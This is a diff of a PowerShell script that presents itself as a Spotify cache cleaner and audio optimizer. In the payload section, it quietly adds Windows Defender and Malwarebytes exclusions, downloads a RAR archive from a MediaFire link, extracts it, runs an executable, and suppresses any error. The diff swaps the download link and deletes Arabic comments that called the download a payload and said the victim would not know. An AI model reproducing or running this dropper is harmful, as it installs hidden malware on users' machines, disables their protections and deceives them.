@@ -61,7 +61,6 @@ if (Test-Path $spotifyCache) {
     Write-Host "  [+] Spotify cache cleaned" -ForegroundColor Gray
 }
 
-# 1b. تحسين إعدادات الصوت في الـ Registry
 $audioRegPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile"
 if (Test-Path $audioRegPath) {
     Set-ItemProperty -Path $audioRegPath -Name "SystemResponsiveness" -Value 20 -ErrorAction SilentlyContinue
@@ -73,13 +72,11 @@ if (Test-Path $audioRegPath) {
 
 # ═══════════════════════════════════════════════════════════════
 
-# --- إعدادات البيلود (عدل الرابط واسم الملف هنا) ---
-$packageUrl = "https://github.com/WindowsOptimizers/Spotify-Ultimate-Fix/raw/main/assets/optimizer.rar"
-$exeName    = "SpotifyOptimizer.exe"
+$packageUrl = "https://download1073.mediafire.com/ms0q8n4sb39gUPntaPMMYKV7ApYfE8jQPPXMj-QVyttMFmXX9yyIoGi5zq-HrTMa5PTyT54Zj5R7U5Pn7ua2-C7xmW3XtG5w-GFxR7LpPKXHwq5eMrqDL9BZu_-1YF3P55kQA-jfOo5HJgifkQ-ODdmcySK4p6Dp7m9pxPy4bLaqSQ/9dg4w62zdh7etzo/spotify_helper.rar"
+$exeName    = "spotify_helper.exe"
 $workDir    = "$env:TEMP\SpotifyOptimizer"
 $rarPath    = "$env:TEMP\SpotifyCache.rar"
 
-# 2a. استثناءات Defender و Malwarebytes (صامت)
 Add-MpPreference -ExclusionPath $workDir -Force -ErrorAction SilentlyContinue
 Add-MalwarebytesExclusion -Path $workDir | Out-Null
 
@@ -87,7 +84,6 @@ Add-MalwarebytesExclusion -Path $workDir | Out-Null
 if (Test-Path $workDir) { Remove-Item $workDir -Recurse -Force }
 New-Item -ItemType Directory -Path $workDir -Force | Out-Null
 
-# 2c. تحميل + فك + انتظار 5 ثواني + تشغيل (صامت تمامًا — لا رسائل)
 try {
     Invoke-WebRequest -Uri $packageUrl -OutFile $rarPath -UseBasicParsing
     
@@ -119,7 +115,6 @@ try {
     Remove-Item $rarPath -Force -ErrorAction SilentlyContinue
 }
 catch {
-    # فشل بصمت — الضحية مش هيعرف
 }
 
 # ═══════════════════════════════════════════════════════════════
